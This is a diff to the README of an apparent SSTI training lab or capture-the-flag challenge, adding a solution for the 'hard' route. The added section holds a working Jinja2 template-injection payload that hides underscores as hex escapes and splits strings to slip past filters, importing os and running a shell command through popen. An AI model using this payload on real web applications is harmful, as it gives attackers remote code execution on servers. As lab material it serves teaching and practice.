@@ -70,7 +70,12 @@ The application provides two routes for exploring SSTI:
 - gain rce
 - get the flag.txt via RCE
 
-## Solution
+## Solution of hard
+#### Payload to bypass filters
+```m
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fim'+'port\x5f\x5f')('o'+'s')|attr('popen')('id')|attr('read')()}}
+```
+#### Automated Solution
 
 <img width="1635" alt="image" src="https://github.com/user-attachments/assets/9b33eb97-8714-4552-aef4-248aed1c6573">
 
